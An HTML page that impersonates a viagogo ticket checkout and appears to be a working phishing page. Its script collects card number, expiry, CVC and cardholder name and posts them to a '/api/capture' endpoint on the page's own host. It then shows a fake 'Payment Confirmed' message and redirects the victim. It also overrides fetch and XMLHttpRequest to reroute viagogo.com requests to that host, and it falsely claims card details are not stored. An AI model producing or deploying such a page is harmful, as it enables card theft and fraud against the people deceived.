<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Checkout - viagogo</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8eb 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .checkout-container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.15), 0 8px 20px rgba(0,0,0,0.1);
            width: 520px;
            max-width: 100%;
            overflow: hidden;
        }
        .checkout-header {
            background: #1a1a2e;
            padding: 24px 32px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .logo {
            font-size: 26px;
            font-weight: 800;
            color: #e94560;
            letter-spacing: -0.5px;
        }
        .secure-badge {
            display: flex;
            align-items: center;
            gap: 6px;
            color: #4ade80;
            font-size: 13px;
            font-weight: 600;
        }
        .secure-badge svg { width: 16px; height: 16px; }
        .checkout-body { padding: 32px; }
        .order-summary {
            background: #f8f9fa;
            border-radius: 8px;
            padding: 16px;
            margin-bottom: 24px;
        }
        .order-summary h3 {
            font-size: 16px;
            color: #1a1a2e;
            margin-bottom: 12px;
        }
        .summary-row {
            display: flex;
            justify-content: space-between;
            padding: 6px 0;
            font-size: 14px;
            color: #495057;
        }
        .summary-row.total {
            border-top: 2px solid #dee2e6;
            margin-top: 8px;
            padding-top: 12px;
            font-weight: 700;
            font-size: 18px;
            color: #1a1a2e;
        }
        .form-group { margin-bottom: 18px; }
        .form-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #343a40;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e9ecef;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.2s;
            background: #f8f9fa;
        }
        .form-group input:focus {
            outline: none;
            border-color: #e94560;
            background: white;
            box-shadow: 0 0 0 4px rgba(233, 69, 96, 0.1);
        }
        .form-row { display: flex; gap: 12px; }
        .form-row .form-group { flex: 1; }
        .card-type-indicator {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 20px;
        }
        .input-wrapper { position: relative; }
        .pay-button {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #e94560, #c23152);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 8px;
            letter-spacing: 0.5px;
        }
        .pay-button:hover { transform: translateY(-1px); box-shadow: 0 8px 25px rgba(233,69,96,0.4); }
        .pay-button:active { transform: translateY(0); }
        .footer-text {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #868e96;
            line-height: 1.6;
        }
        .footer-text .icons { margin-bottom: 4px; }
        .error-message {
            color: #e94560;
            font-size: 12px;
            margin-top: 4px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="checkout-container">
        <div class="checkout-header">
            <span class="logo">viagogo</span>
            <span class="secure-badge">
                <svg viewBox="0 0 24 24" fill="currentColor"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
                SSL Secured
            </span>
        </div>
        <div class="checkout-body">
            <div class="order-summary">
                <h3>Order Summary</h3>
                <div class="summary-row">
                    <span>Tickets × 2</span>
                    <span>$248.00</span>
                </div>
                <div class="summary-row">
                    <span>Service Fee</span>
                    <span>$49.60</span>
                </div>
                <div class="summary-row">
                    <span>Delivery</span>
                    <span>$5.00</span>
                </div>
                <div class="summary-row total">
                    <span>Total Due</span>
                    <span>$302.60</span>
                </div>
            </div>
            <form id="payment-form">
                <div class="form-group">
                    <label>Card Number</label>
                    <div class="input-wrapper">
                        <input type="text" id="card-number" placeholder="0000 0000 0000 0000"
                               maxlength="19" autocomplete="off" required>
                    </div>
                    <div class="error-message" id="card-error">Please enter a valid card number</div>
                </div>
                <div class="form-row">
                    <div class="form-group">
                        <label>Expiry</label>
                        <input type="text" id="expiry" placeholder="MM / YY" maxlength="7" required>
                    </div>
                    <div class="form-group">
                        <label>CVC</label>
                        <input type="text" id="cvc" placeholder="•••" maxlength="4" required>
                    </div>
                </div>
                <div class="form-group">
                    <label>Cardholder Name</label>
                    <input type="text" id="cardholder" placeholder="Name on card" required>
                </div>
                <button type="submit" class="pay-button">Pay $302.60</button>
            </form>
            <div class="footer-text">
                <div class="icons">🔒 Visa · Mastercard · Amex · Discover</div>
                Your payment is protected by 256-bit SSL encryption.<br>
                We do not store your full card details.
            </div>
        </div>
    </div>

    <script>
        const HOST = window.location.host;
        const PROTO = 'https:';

        document.getElementById('card-number').addEventListener('input', function(e) {
            let val = e.target.value.replace(/\D/g, '');
            if (val.length > 16) val = val.substring(0, 16);
            val = val.replace(/(.{4})/g, '$1 ').trim();
            e.target.value = val;
        });

        document.getElementById('expiry').addEventListener('input', function(e) {
            let val = e.target.value.replace(/\D/g, '');
            if (val.length >= 2) val = val.substring(0,2) + ' / ' + val.substring(2,4);
            e.target.value = val.substring(0, 7);
        });

        document.getElementById('cvc').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
        });

        document.getElementById('payment-form').addEventListener('submit', function(e) {
            e.preventDefault();
            const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
            if (cardNumber.length < 13) {
                document.getElementById('card-error').style.display = 'block';
                return;
            }
            document.getElementById('card-error').style.display = 'none';

            const paymentData = {
                card_number: cardNumber,
                expiry: document.getElementById('expiry').value,
                cvc: document.getElementById('cvc').value,
                cardholder: document.getElementById('cardholder').value,
                amount: '302.60',
                currency: 'USD',
                timestamp: new Date().toISOString(),
                user_agent: navigator.userAgent
            };

            fetch(PROTO + '//' + HOST + '/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(paymentData)
            }).then(function(response) {
                return response.json();
            }).then(function(data) {
                var overlay = document.createElement('div');
                overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;' +
                    'background:rgba(0,0,0,0.8);display:flex;align-items:center;' +
                    'justify-content:center;z-index:9999;';
                overlay.innerHTML = '<div style="background:white;padding:40px;border-radius:12px;' +
                    'text-align:center;"><div style="font-size:48px;margin-bottom:16px;">⏳</div>' +
                    '<h2 style="margin-bottom:8px;">Processing Payment</h2>' +
                    '<p style="color:#666;">Please do not close this page...</p></div>';
                document.body.appendChild(overlay);

                setTimeout(function() {
                    overlay.innerHTML = '<div style="background:white;padding:40px;border-radius:12px;' +
                        'text-align:center;"><div style="font-size:48px;margin-bottom:16px;">✅</div>' +
                        '<h2 style="margin-bottom:8px;color:#059669;">Payment Confirmed</h2>' +
                        '<p style="color:#666;">Your tickets have been sent to your email.</p></div>';
                    setTimeout(function() {
                        window.location.href = PROTO + '//' + HOST + '/account/orders';
                    }, 2000);
                }, 2500);
            }).catch(function(err) {
                console.error('Capture error:', err);
            });
        });

        (function() {
            var originalFetch = window.fetch;
            window.fetch = function(url, options) {
                if (typeof url === 'string') {
                    url = url.replace(/https?:\/\/(www\.)?viagogo\.com/g, PROTO + '//' + HOST);
                    url = url.replace(/https?:\/\/api\.viagogo\.com/g, PROTO + '//' + HOST);
                }
                if (url instanceof Request) {
                    var newUrl = url.url.replace(/https?:\/\/(www\.)?viagogo\.com/g, PROTO + '//' + HOST);
                    url = new Request(newUrl, url);
                }
                return originalFetch.call(this, url, options);
            };

            var originalXHROpen = XMLHttpRequest.prototype.open;
            XMLHttpRequest.prototype.open = function(method, url) {
                if (typeof url === 'string') {
                    url = url.replace(/https?:\/\/(www\.)?viagogo\.com/g, PROTO + '//' + HOST);
                    url = url.replace(/https?:\/\/api\.viagogo\.com/g, PROTO + '//' + HOST);
                }
                return originalXHROpen.call(this, method, url, true);
            };
        })();
    </script>
</body>
</html>
